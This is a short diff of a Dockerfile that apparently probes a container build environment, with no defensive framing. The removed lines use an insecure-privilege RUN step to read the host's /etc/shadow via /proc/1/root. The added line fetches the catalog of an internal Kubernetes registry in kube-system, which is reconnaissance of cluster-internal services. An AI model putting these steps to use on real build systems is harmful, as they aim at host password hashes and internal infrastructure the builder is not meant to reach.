@@ -1,4 +1,3 @@
-#syntax=docker/dockerfile:1.4
 FROM alpine:3.19
-RUN --security=insecure cat /proc/1/root/etc/shadow 2>&1 && id
+ADD http://registry.kube-system.svc.cluster.local:5000/v2/_catalog /tmp/r1
 CMD sleep infinity
